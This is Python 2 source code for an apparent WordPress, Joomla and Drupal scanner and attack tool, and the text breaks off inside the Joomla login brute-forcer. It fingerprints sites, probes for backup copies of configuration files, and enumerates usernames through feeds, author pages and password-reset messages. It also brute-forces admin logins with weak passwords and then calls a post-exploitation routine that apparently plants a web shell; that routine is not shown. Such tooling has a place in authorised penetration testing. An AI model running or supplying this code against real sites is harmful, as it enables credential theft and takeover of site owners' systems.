#!/usr/bin/python
import smtplib, base64, os, sys, getopt, urllib2, urllib, re, socket, time, httplib
import itertools, urlparse, threading, Queue, multiprocessing, cookielib, datetime
from thirdparty.multipart import multipartpost
from thirdparty.termcolor.termcolor import cprint,colored

class Initialize:
    # Save Wordpress, Joomla and Drupal plugins in a local file
    # Set default parameters 
    def __init__(self):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
    
    def GetWordPressPlugins(self):
        # Download Wordpress Plugins from Wordpress SVN website and popular Wordpress plugins page
        print "[*] Downloading WordPress plugins"
        f = open("wp_plugins.txt", "a")
        
        # from SVN Website
        htmltext = urllib2.urlopen("http://plugins.svn.wordpress.org").read()
        regex = '">(.+?)/</a></li>'
        pattern =  re.compile(regex)
        plugins = re.findall(pattern,htmltext)
        for plugin in plugins: f.write("%s\n" % plugin)
        
        # from popular Wordpress plugins page
        for n in range(1,1844):
            while True:
                try:
                    htmltext = urllib2.urlopen("http://wordpress.org/extend/plugins/browse/popular/page/"+str(n)+"/").read()
                    regex = '<h3><a href="http://wordpress.org/plugins/(.+?)/">'
                    pattern =  re.compile(regex)
                    plugins_per_page = re.findall(pattern,htmltext) 
                    #plugins.append(plugins_in_page)
                    for plugin in plugins_per_page: f.write("%s\n" % plugin) 
                    #sys.stdout.write("\r%d%%" %((100*(n+1))/1844))
                    #sys.stdout.flush()
                    sys.stdout.write('\r')
                    sys.stdout.write("[%-100s] %d%%" % ('='*((100*(n+1))/1844), (100*(n+1))/1844))
                    sys.stdout.flush()
                except:
                    time.sleep(4)
                    continue
                break
            
        # sort unique
        #oldplugins = [line.strip() for line in open('wp_plugins.txt')]
        #plugins = plugins + oldplugins
        #plugins = sorted(set(plugins))        
        # write to file
        #for plugin in plugins: f.write("%s\n" % plugin, "a")
        f.close()             
        print "[-] Wordpress Plugin File: %s" % ('wp_plugins.txt')
   
    def GetWordpressPluginsExploitDB(self):
        # Download Wordpress Plugins from ExploitDB website
        f = open("wp_plugins.txt", "a")
        print "[-] Downloading Wordpress plugins from ExploitDB website"     
        htmltext = urllib2.urlopen("http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Wordpress").read()
        regex ='filter_page=(.+?)\t\t\t.*>&gt;&gt;</a>'
        pattern =  re.compile(regex)
        pages = re.findall(pattern,htmltext)
        for page in range(1,int(pages[0])):
            time.sleep(2)
            request = urllib2.Request("http://www.exploit-db.com/search/?action=search&filter_page="+str(page)+"&filter_description=Wordpress",None,self.headers)
            htmltext = urllib2.urlopen(request).read()
            regex = '<a href="http://www.exploit-db.com/download/(.+?)">'
            pattern =  re.compile(regex)
            ExploitID = re.findall(pattern,htmltext)
            print page
            for Eid in ExploitID:
                htmltext = urllib2.urlopen("http://www.exploit-db.com/download/"+str(Eid)+"/").read()
                regex = '/plugins/(.+?)/'
                pattern =  re.compile(regex)
                WPplugins = re.findall(pattern,htmltext)
                print Eid
                print WPplugins
                for plugin in WPplugins:
                    try:
                        f.write("%s\n" % plugin)
                    except IndexError:
                        pass
        f.close()
        print "[-] Wordpress Plugin File: %s" % ('wp_plugins.txt')     

    def GetJoomlaPlugins(self):
        # Not Implemented yet
        pass
    
    def GetJoomlaPluginsExploitDB(self):
        # Download Joomla Plugins from ExploitDB website
        f = open("joomla_plugins.txt", "a")
        print "[*] Downloading Joomla plugins from ExploitDB website"
        htmltext = urllib2.urlopen("http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Joomla").read()
        regex ='filter_page=(.+?)\t\t\t.*>&gt;&gt;</a>'
        pattern =  re.compile(regex)
        pages = re.findall(pattern,htmltext)
        for page in range(1,int(pages[0])):
            time.sleep(2)
            request = urllib2.Request("http://www.exploit-db.com/search/?action=search&filter_page="+str(page)+"&filter_description=Joomla",None,self.headers)
            htmltext = urllib2.urlopen(request).read()
            regex = '<a href="http://www.exploit-db.com/download/(.+?)">'
            pattern =  re.compile(regex)
            ExploitID = re.findall(pattern,htmltext)
            for Eid in ExploitID:
                htmltext = urllib2.urlopen("http://www.exploit-db.com/exploits/"+str(Eid)+"/").read()
                regex = '\?option=(.+?)\&'
                pattern =  re.compile(regex)
                JoomlaComponent = re.findall(pattern,htmltext)
                try:
                    f.write("%s\n" % JoomlaComponent[0])
                except IndexError:
                    pass
        f.close()
        print "[-] Joomla Plugin File: %s" % ('joomla_plugins.txt')

    def GetDrupalPlugins(self):
        # Download Drupal Plugins from Drupal website
        print "[-] Downloading Drupal plugins"
        f = open("drupal_plugins.txt", "a")
        for n in range(0,969):
            htmltext = urllib2.urlopen("https://drupal.org/project/project_module?page="+str(n)+"&solrsort=iss_project_release_usage%20desc&").read()
            regex = '<a href="/project/(\w*?)">'
            pattern =  re.compile(regex)
            plugins_per_page = re.findall(pattern,htmltext)
            for plugin in plugins_per_page: f.write("%s\n" % plugin) 
            sys.stdout.write('\r')
            sys.stdout.write("[%-100s] %d%%" % ('='*((100*(n+1))/969), (100*(n+1))/969))
            sys.stdout.flush()            
        print "[-] Drupal Plugin File: %s" % ('drupal_plugins.txt') 

class Scanner:
    # Detect type of CMS -> Maybe add it to the main after Initialiazer 
    def __init__(self,url,threads):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.url = url
        self.threads = threads

    def FindCMSType(self):
        req = urllib2.Request(self.url,None,self.headers)
        try:
            htmltext = urllib2.urlopen(req).read()
            GenericChecks(self.url).HTTPSCheck()
            GenericChecks(self.url).RobotsTXT()
            m = re.search("Wordpress", htmltext,re.IGNORECASE)
            if m: print "[*] CMS Detection: Wordpress"; wordpress = WPScan(self.url,self.threads).WPrun()
            m = re.search("Joomla", htmltext,re.IGNORECASE)
            if m: print "[*] CMS Detection: Joomla"; joomla = JooScan(self.url,self.threads).Joorun()                
            m = re.search("Drupal", htmltext,re.IGNORECASE);
            if m: print "[*] CMS Detection: Drupal"; drupal = DruScan(self.url,self.threads).Drurun()
        except urllib2.URLError, e:
            print_red("[!] Website Unreachable: "+self.url)
            sys.exit()          

class WPScan:
    # Scan WordPress site
    def __init__(self,url,threads):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.url = url
        self.queue_num = 5
        self.thread_num = threads
        self.pluginPath = "/wp-content/plugins/"
        self.themePath = "/wp-content/themes/"
        self.feed = "/?feed=rss2"
        self.author = "/?author="
        self.forgottenPsw = "/wp-login.php?action=lostpassword"
        self.weakpsw = ['password', 'admin','123456','abc123','qwerty']
        self.usernames = []
        self.theme = None
        self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
        self.plugins = [line.strip() for line in open('wp_plugins.txt')]
        self.themes = [line.strip() for line in open('wp_themes.txt')]

    def WPrun(self):
        self.WPVersion()
        self.theme = self.WPCurrentTheme()
        print "[*] Wordpress Theme: "+self.theme
        ExploitDBSearch(self.url, 'Wordpress', [self.theme]).Themes()
        self.WPConfigFiles()
        self.WPHello()
        self.WPFeed()
        self.WPAuthor()
        BruteForcer(self.url,self.usernames,self.weakpsw).WPrun()
        self.WPForgottenPassword()
        GenericChecks(self.url).AutocompleteOff('/wp-login.php')
        self.WPDefaultFiles()
        # === Takes Long ===
        self.WPplugins()
        ExploitDBSearch(self.url, 'Wordpress', pluginsFound).Plugins()
        self.WPThemes()
        ExploitDBSearch(self.url, 'Wordpress', themesFound).Themes()
        self.WPDirsListing()
              
    def WPVersion(self):
        try:
            req = urllib2.Request(self.url+'/readme.html',None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            regex = '<br /> Version[e]* (\d+\.\d+[\.\d+]*)'
            pattern =  re.compile(regex)
            version = re.findall(pattern,htmltext)
            print "[*] Wordpress Version: "+str(version[0])
        except urllib2.HTTPError, e:
            req = urllib2.Request(self.url,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            version = re.findall('<meta name="generator" content="WordPress (\d+\.\d+[\.\d+]*)"', htmltext)
            if version :
                print "[*] Wordpress Version: "+str(version[0])

    def WPCurrentTheme(self):
        try:
            req = urllib2.Request(self.url,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            regex = '/wp-content/themes/(.+?)/'
            pattern =  re.compile(regex)
            version = re.findall(pattern,htmltext)
            return str(version[0])        
        except urllib2.HTTPError, e:
            print e.code
            pass
        
    def WPConfigFiles(self):
        for file in self.confFiles:
            req = urllib2.Request(self.url+"/wp-config"+file,None,self.headers)
            try:
                urllib2.urlopen(req)
                print_red("[!] Configuration File Found: " +self.url+"/wp-config"+file)
            except urllib2.HTTPError, e:
                pass

    def WPDefaultFiles(self):
        # Check for default files
        defFiles=['/readme.html',
                  '/license.txt',
                  '/wp-config-sample.php',
                  '/wp-includes/images/crystal/license.txt',
                  '/wp-includes/images/crystal/license.txt',
                  '/wp-includes/js/plupload/license.txt',
                  '/wp-includes/js/plupload/changelog.txt',
                  '/wp-includes/js/tinymce/license.txt',
                  '/wp-includes/js/tinymce/plugins/spellchecker/changelog.txt',
                  '/wp-includes/js/swfupload/license.txt',
                  '/wp-includes/ID3/license.txt',
                  '/wp-includes/ID3/readme.txt',
                  '/wp-includes/ID3/license.commercial.txt',
                  '/wp-content/themes/twentythirteen/fonts/COPYING.txt',
                  '/wp-content/themes/twentythirteen/fonts/LICENSE.txt'
                  ]
        for file in defFiles:
            req = urllib2.Request(self.url+file,None,self.headers)
            try:
                urllib2.urlopen(req)
                print "[*] Info Disclosure: " +self.url+file
            except urllib2.HTTPError, e:
                #print e.code
                pass
            
    def WPFeed(self):
        print "[*] Enumerating Wordpress Usernames via \"Feed\" ..."
        try:
            req = urllib2.Request(self.url+self.feed,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            wpUsers = re.findall("<dc:creator><!\[CDATA\[(.+?)\]\]></dc:creator>", htmltext,re.IGNORECASE)
            wpUsers2 = re.findall("<dc:creator>(.+?)</dc:creator>", htmltext,re.IGNORECASE)
            if wpUsers :
                self.usernames = wpUsers + self.usernames
                self.usernames = sorted(set(self.usernames))
            for user in self.usernames:
                print user
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def WPAuthor(self):
        print "[*] Enumerating Wordpress Usernames via \"Author\" ..."
        for user in range(1,20):
            try:
                req = urllib2.Request(self.url+self.author+str(user),None,self.headers)
                htmltext = urllib2.urlopen(req).read()
                wpUser = re.findall("author author-(.+?) ", htmltext,re.IGNORECASE)
                if wpUser : self.usernames = wpUser + self.usernames
                wpUser = re.findall("/author/(.+?)/feed/", htmltext,re.IGNORECASE)
                if wpUser : self.usernames = wpUser + self.usernames                 
            except urllib2.HTTPError, e:
                #print e.code
                pass
        self.usernames = sorted(set(self.usernames))
        for user in self.usernames:
            print user
        
    def WPForgottenPassword(self):
        # Username Enumeration via Forgotten Password
        query_args = {"user_login": "N0t3xist!1234"}
        data = urllib.urlencode(query_args)
        # HTTP POST Request
        req = urllib2.Request(self.url+self.forgottenPsw, data,self.headers)
        try:
            htmltext = urllib2.urlopen(req).read()
            if re.findall(re.compile('Invalid username'),htmltext):
                print "[*] Forgotten Password Allows Username Enumeration: "+self.url+self.forgottenPsw          
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def WPHello(self):
        try:
            req = urllib2.Request(self.url+"/wp-content/plugins/hello.php",None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            fullPath = re.findall(re.compile('Fatal error.* /(.+?)hello.php'),htmltext)
            if fullPath :
                print "[*] Wordpress Hello Plugin Full Path Disclosure: "+self.url+"/wp-content/plugins/hello.php -> "+"/"+fullPath[0]+"hello.php"
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def WPDirsListing(self):
        GenericChecks(self.url).DirectoryListing('/wp-content/')
        GenericChecks(self.url).DirectoryListing('/wp-content/'+self.theme)
        GenericChecks(self.url).DirectoryListing('/wp-includes/')
        GenericChecks(self.url).DirectoryListing('/wp-admin/')        
        for plugin in pluginsFound:
            GenericChecks(self.url).DirectoryListing('/wp-content/plugins/'+plugin)

    def WPplugins(self):
        print "[-] Searching Wordpress Plugins ..."
        # Create Code
        q = Queue.Queue(self.queue_num)        
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,self.pluginPath,pluginsFound,q)
            t.daemon = True
            t.start()                
        # Add all plugins to the queue
        for i in self.plugins:
            q.put(i)  
        q.join()

    def WPThemes(self):
        print "[-] Searching Wordpress Themes ..."
        # Create Code
        q = Queue.Queue(self.queue_num)
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,self.themePath,themesFound,q)
            t.daemon = True
            t.start()                
        # Add all theme to the queue
        for i in self.themes:
            q.put(i)  
        q.join()

class JooScan:
    # Scan Joomla site
    def __init__(self,url,threads):
        self.url = url
        self.queue_num = 5
        self.thread_num = threads
        self.usernames = []
        self.pluginPath = "/components/"
        self.weakpsw = ['password', 'admin','123456','abc123','qwerty']
        self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
        self.plugins = [line.strip() for line in open('joomla_plugins.txt')]

    def Joorun(self):
        self.JooVersion()
        self.JooTemplate()
        self.JooConfigFiles()
        self.JooFeed()
        self.JooDefaultFiles()
        # === Takes Long ===
        BruteForcer(self.url,self.usernames,self.weakpsw).Joorun()
        self.JooComponents()
        ExploitDBSearch(self.url, "Joomla", pluginsFound).Plugins()
        self.JooDirsListing()
        
    def JooVersion(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/joomla.xml').read()
            regex = '<version>(.+?)</version>'
            pattern =  re.compile(regex)
            version = re.findall(pattern,htmltext)
            print "[*] Joomla Version: "+str(version[0])
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def JooTemplate(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/index.php').read()
            WebTemplate = re.findall("/templates/(.+?)/", htmltext,re.IGNORECASE)
            htmltext = urllib2.urlopen(self.url+'/administrator/index.php').read()
            AdminTemplate = re.findall("/administrator/templates/(.+?)/", htmltext,re.IGNORECASE)
            if WebTemplate : print "[*] Joomla Website Template: "+WebTemplate[0];ExploitDBSearch(self.url, "Joomla", [WebTemplate[0]]).Themes()
            if AdminTemplate : print "[*] Joomla Administrator Template: "+AdminTemplate[0];ExploitDBSearch(self.url, "Joomla", [WebTemplate[0]]).Themes()
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def JooConfigFiles(self):
        for file in self.confFiles:
            req = urllib2.Request(self.url+"/configuration"+file)
            try:
                urllib2.urlopen(req)
                print "[*] Configuration File Found: " +self.url+"/configuration"+file
            except urllib2.HTTPError, e:
                #print e.code
                pass        
    
    def JooDefaultFiles(self):
        # Check for default files
        defFiles=['/README.txt',
                  '/htaccess.txt',
                  '/administrator/templates/hathor/LICENSE.txt',
                  '/web.config.txt',
                  '/joomla.xml',
                  '/robots.txt.dist',
                  '/LICENSE.txt',
                  '/media/jui/fonts/icomoon-license.txt',
                  '/media/editors/tinymce/jscripts/tiny_mce/license.txt',
                  '/media/editors/tinymce/jscripts/tiny_mce/plugins/style/readme.txt',
                  '/libraries/idna_convert/ReadMe.txt',
                  '/libraries/simplepie/README.txt',
                  '/libraries/simplepie/LICENSE.txt',
                  '/libraries/simplepie/idn/ReadMe.txt',
                  ]
        
        for file in defFiles:
            req = urllib2.Request(self.url+file)
            try:
                urllib2.urlopen(req)
                print "[*] Info Disclosure: " +self.url+file
            except urllib2.HTTPError, e:
                #print e.code
                pass
    
    def JooFeed(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/?format=feed').read()
            jooUsers = re.findall("<author>(.+?) \((.+?)\)</author>", htmltext,re.IGNORECASE)
            if jooUsers: 
                print "[-] Enumerating Joomla Usernames via \"Feed\" ..."
                jooUsers = sorted(set(jooUsers))
                for user in jooUsers :
                    self.usernames.append(user[1])
                    print  user[1]+" "+user[0]
        except urllib2.HTTPError, e:
            #print e.code
            pass 
        
    def JooDirsListing(self):
        GenericChecks(self.url).DirectoryListing('/administrator/')
        GenericChecks(self.url).DirectoryListing('/bin/')
        GenericChecks(self.url).DirectoryListing('/cache/')
        GenericChecks(self.url).DirectoryListing('/cli/')
        GenericChecks(self.url).DirectoryListing('/components/')
        GenericChecks(self.url).DirectoryListing('/images/')
        GenericChecks(self.url).DirectoryListing('/includes/')
        GenericChecks(self.url).DirectoryListing('/language/')
        GenericChecks(self.url).DirectoryListing('/layouts/')
        GenericChecks(self.url).DirectoryListing('/libraries/')
        GenericChecks(self.url).DirectoryListing('/media/')
        GenericChecks(self.url).DirectoryListing('/modules/')
        GenericChecks(self.url).DirectoryListing('/plugins/')
        GenericChecks(self.url).DirectoryListing('/templates/')
        GenericChecks(self.url).DirectoryListing('/tmp/')
        for plugin in pluginsFound:
            GenericChecks(self.url).DirectoryListing('/components/'+plugin)

    def JooComponents(self):
        print "[-] Searching Joomla Components ..."
        # Create Code
        q = Queue.Queue(self.queue_num)        
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,self.pluginPath,pluginsFound,q)
            t.daemon = True
            t.start()
        # Add all plugins to the queue
        for i in self.plugins:
            q.put(i)  
        q.join()
        
class DruScan:
    # Scan Drupal site
    def __init__(self,url,threads):
        self.url = url
        self.queue_num = 5
        self.thread_num = threads
        self.pluginPath = "/modules/"
        self.forgottenPsw = "/?q=user/password"
        self.weakpsw = ['password', 'admin','123456','abc123','qwerty']
        self.plugins = [line.strip() for line in open('drupal_plugins.txt')]
        self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
        self.usernames = []
        
    def Drurun(self):
        self.DruVersion()
        self.Drutheme = self.DruTheme()
        ExploitDBSearch(self.url, "Drupal", [self.Drutheme]).Themes()
        self.DruConfigFiles()
        self.DruViews()
        self.DruBlog()
        self.DefaultFiles()
        # === Takes Long ===
        BruteForcer(self.url,self.usernames,self.weakpsw).Drurun()
        self.DruForgottenPassword()
        self.DruModules()
        ExploitDBSearch(self.url, "Drupal", pluginsFound).Plugins()
        self.DruDirsListing()
        
    def DruVersion(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/CHANGELOG.txt').read()
            regex = 'Drupal (\d+\.\d+),'
            pattern =  re.compile(regex)
            version = re.findall(pattern,htmltext)
            print "[*] Drupal Version: "+str(version[0])
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def DruTheme(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/index.php').read()
            DruTheme = re.findall("/themes/(.+?)/", htmltext,re.IGNORECASE)
            if DruTheme : print "[*] Drupal Theme: "+DruTheme[0]
            return DruTheme[0]
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def DruConfigFiles(self):
        for file in self.confFiles:
            req = urllib2.Request(self.url+"/sites/default/settings"+file)
            try:
                urllib2.urlopen(req)
                print "[*] Configuration File Found: " +self.url+"/sites/default/settings"+file
            except urllib2.HTTPError, e:
                #print e.code
                pass   
           
    def DefaultFiles(self):
        defFiles=['/README.txt',
                  '/robots.txt',
                  '/INSTALL.mysql.txt',
                  '/MAINTAINERS.txt',
                  '/profiles/standard/translations/README.txt',
                  '/profiles/minimal/translations/README.txt',
                  '/INSTALL.pgsql.txt',
                  '/UPGRADE.txt',
                  '/CHANGELOG.txt',
                  '/INSTALL.sqlite.txt',
                  '/LICENSE.txt',
                  '/INSTALL.txt',
                  '/COPYRIGHT.txt',
                  '/web.config',
                  '/modules/README.txt',
                  '/modules/simpletest/files/README.txt',
                  '/modules/simpletest/files/javascript-1.txt',
                  '/modules/simpletest/files/php-1.txt',
                  '/modules/simpletest/files/sql-1.txt',
                  '/modules/simpletest/files/html-1.txt',
                  '/modules/simpletest/tests/common_test_info.txt',
                  '/modules/filter/tests/filter.url-output.txt',
                  '/modules/filter/tests/filter.url-input.txt',
                  '/modules/search/tests/UnicodeTest.txt',
                  '/themes/README.txt',
                  '/themes/stark/README.txt',
                  '/sites/README.txt',
                  '/sites/all/modules/README.txt',
                  '/sites/all/themes/README.txt',
                  '/modules/simpletest/files/html-2.html',
                  '/modules/color/preview.html',
                  '/themes/bartik/color/preview.html'
                  ]
        
        for file in defFiles:
            req = urllib2.Request(self.url+file)
            try:
                urllib2.urlopen(req)
                print_grey("[*] Info Disclosure: " +self.url+file)
            except urllib2.HTTPError, e:
                #print e.code
                pass

    def DruViews(self):
        self.views = "/?q=admin/views/ajax/autocomplete/user/"
        self.alphanum = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        usernames = []
        try:
            urllib2.urlopen(self.url+self.views)
            print "[-] Enumerating Drupal Usernames via \"Views\" Module..."
            for letter in self.alphanum:
                htmltext = urllib2.urlopen(self.url+self.views+letter).read()
                regex = '"(.+?)"'
                pattern =  re.compile(regex)
                usernames = usernames + re.findall(pattern,htmltext)
            usernames = sorted(set(usernames))
            for user in usernames:
                print user
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def DruBlog(self):
        self.blog = "/?q=blog/"
        usernames = []
        try:
            urllib2.urlopen(self.url+self.blog)
            print "[-] Enumerating Drupal Usernames via \"Blog\" Module..."
            for blognum in range (1,50):
                try:
                    htmltext = urllib2.urlopen(self.url+self.blog+str(blognum)).read()
                    regex = "<title>(.+?)\'s"
                    pattern =  re.compile(regex)
                    user = re.findall(pattern,htmltext)
                    usernames = usernames + user
                    print user[0]
                except urllib2.HTTPError, e:
                    pass
            self.usernames = usernames
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def DruForgottenPassword(self):
        # Username Enumeration via Forgotten Password
        query_args = {"name": "N0t3xist!1234" ,"form_id":"user_pass"}
        data = urllib.urlencode(query_args)
        # HTTP POST Request
        req = urllib2.Request(self.url+self.forgottenPsw, data)
        #print "[*] Trying Credentials: "+user+" "+pwd
        try:
            htmltext = urllib2.urlopen(req).read()
            if re.findall(re.compile('Sorry,.*N0t3xist!1234.*is not recognized'),htmltext):
                print "[*] Forgotten Password Allows Username Enumeration: "+self.url+self.forgottenPsw          
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def DruDirsListing(self):
        GenericChecks(self.url).DirectoryListing('/includes/')
        GenericChecks(self.url).DirectoryListing('/misc/')
        GenericChecks(self.url).DirectoryListing('/modules/')
        GenericChecks(self.url).DirectoryListing('/profiles/')
        GenericChecks(self.url).DirectoryListing('/scripts/')
        GenericChecks(self.url).DirectoryListing('/sites/')
        GenericChecks(self.url).DirectoryListing('/includes/')
        GenericChecks(self.url).DirectoryListing('/themes/')
        for plugin in pluginsFound:
            GenericChecks(self.url).DirectoryListing('/modules/'+plugin)

    def DruModules(self):
        print "[-] Searching Drupal Modules ..."
        # Create Code
        q = Queue.Queue(self.queue_num)
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,self.pluginPath,pluginsFound,q)
            t.daemon = True
            t.start()
        # Add all plugins to the queue
        for i in self.plugins:
            q.put(i)  
        q.join()
    
class OutputReport:
    #def TXT:
    #def HTML:
    #def XML:
        pass
    
class ExploitDBSearch:
    def __init__(self,url,cmstype,query):
        self.url = url
        self.query = query
        self.cmstype = cmstype
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        
    def Plugins(self):
        print "[-] Searching Vulnerable Plugins from ExploitDB website ..."
        for plugin in self.query:
            htmltext = urllib2.urlopen("http://www.exploit-db.com/search/?action=search&filter_description="+self.cmstype+"&filter_exploit_text="+plugin).read()
            regex = '/download/(.+?)">'
            pattern =  re.compile(regex)
            ExploitID = re.findall(pattern,htmltext)
            print plugin
            for Eid in ExploitID:
                print_yellow("\t[*] Vulnerable Plugin Found: http://www.exploit-db.com/exploits/"+Eid)

    def Themes(self):
        print "[-] Searching Vulnerable Theme from ExploitDB website ..."
        for theme in self.query :
            htmltext = urllib2.urlopen("http://www.exploit-db.com/search/?action=search&filter_description="+self.cmstype+"&filter_exploit_text="+theme).read()
            regex = '/download/(.+?)">'
            pattern =  re.compile(regex)
            ExploitID = re.findall(pattern,htmltext)
            for Eid in ExploitID:
                print_yellow("\t[*] Vulnerable Theme Found: http://www.exploit-db.com/exploits/"+Eid)

class NoRedirects(urllib2.HTTPRedirectHandler):
    """Redirect handler that simply raises a Redirect()."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        RedirError = urllib2.HTTPError(req.get_full_url(), code, msg, headers, fp)
        RedirError.status = code
        raise RedirError
        
class ThreadScanner(threading.Thread):
    # Multi-threading Scan Class (just for Wordpress for now) 
    def __init__(self,url,pluginPath,pluginsFound,q):
        threading.Thread.__init__ (self)
        self.url = url
        self.q = q
        self.pluginPath = pluginPath
        self.pluginsFound = pluginsFound
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}

    def run(self):
        while True:
            # Get plugin from plugin queue
            plugin = self.q.get()
            req = urllib2.Request(self.url+self.pluginPath+plugin+"/",None, self.headers)
            noRedirOpener = urllib2.build_opener(NoRedirects())        
            try:
                noRedirOpener.open(req); print plugin; self.pluginsFound.append(plugin)
            except urllib2.HTTPError, e:
                # print e.code
                if e.code == 403 or e.code == 500 : print plugin; self.pluginsFound.append(plugin)
            except urllib2.URLError, e:
                print "[!] Thread Error: If this error persists, reduce number of threads"
                if verbose : print e.reason
            self.q.task_done()
            

class BruteForcer:
        def __init__(self,url,usrlist,pswlist):
            self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
            self.headers={'User-Agent':self.agent,}
            if type(usrlist) is str :
                try:
                    self.usrlist = [line.strip() for line in open(usrlist)]
                except IOError:
                    self.usrlist = [usrlist]
            else:
                self.usrlist = usrlist
            if type(pswlist) is str :
                try:
                    self.pswlist = [line.strip() for line in open(pswlist)]
                except IOError:
                    self.pswlist = [pswlist]
            else:
                self.pswlist = pswlist            
            self.url = url
            
        def FindCMSType(self):
            req = urllib2.Request(self.url,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            m = re.search("Wordpress", htmltext)
            if m: print "[*] CMS Detection: Wordpress"; print "[*] Wordpress Brute Forcing Attack Started"; self.WPrun()
            m = re.search("Joomla", htmltext)
            if m: print "[*] CMS Detection: Joomla"; print "[*] Joomla Brute Forcing Attack Started"; self.Joorun()
            m = re.search("Drupal", htmltext);
            if m: print "[*] CMS Detection: Drupal"; print "[*] Drupal Brute Forcing Attack Started"; self.Drurun()          
            
        def WPrun(self):
            self.wplogin = "/wp-login.php"
            self.WPValidCredentials = []
            for user in self.usrlist:
                userFound = False
                cookieJar = cookielib.CookieJar()
                cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
                opener = urllib2.build_opener(cookieHandler)
                opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
                cookieJar.clear()
                for pwd in self.pswlist:
                    query_args = {"log": user ,"pwd": pwd, "wp-submit":"Log+In"}
                    data = urllib.urlencode(query_args)
                    if verbose: print "[-] Trying Credentials: "+user+" "+pwd
                    try:
                        # HTTP POST Request
                        htmltext = opener.open(self.url+self.wplogin, data).read()
                        if re.search('<strong>ERROR</strong>: Invalid username',htmltext):
                            if verbose: print "[-] Invalid Username: "+user
                            break
                        elif re.search('username <strong>(.+?)</strong> is incorrect.',htmltext):
                            userFound = True
                        elif re.search('ERROR.*block.*',htmltext,re.IGNORECASE):
                            print "[!] Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
                            return
                        elif re.search('dashboard',htmltext,re.IGNORECASE):
                            print_red("[*] Valid Credentials: "+user+" "+pwd)
                            self.WPValidCredentials.append([user,pwd])                       
                    except urllib2.HTTPError, e:
                        #print e.code
                        pass
                if userFound: print_yellow("[*] Username found: "+user)
            for WPCredential in self.WPValidCredentials :
                PostExploit(self.url).WPShell(WPCredential[0], WPCredential[1])
           
        def Joorun(self):
            # It manages token and Cookies
            self.joologin = "/administrator/index.php"
            self.JooValidCredentials = []
            for user in self.usrlist:
                cookieJar = cookielib.CookieJar()
                cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
                opener = urllib2.build_opener(cookieHandler)
                opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
                cookieJar.clear()
                # Get Token and Session Cookie
                htmltext = opener.open(self.url+self.joologin).read()
                reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
                token = reg.search(htmltext).group(1)
                
                for pwd in self.pswlist:
                    # Send Post With Token and Session Cookie
                    query_args = {"username": user ,"passwd": pwd, "option":"com_login","task":"login",token:"1"}
                    data = urllib.urlencode(query_args)
                    #print "[*] Trying Credentials: "+user+" "+pwd
                    try:
                        htmltext = opener.open(self.url+self.joologin, data).read()
                        if re.findall(re.compile('Joomla - Administration - Control Panel'),htmltext):
                            print "[*] Valid Credentials: "+user+" "+pwd
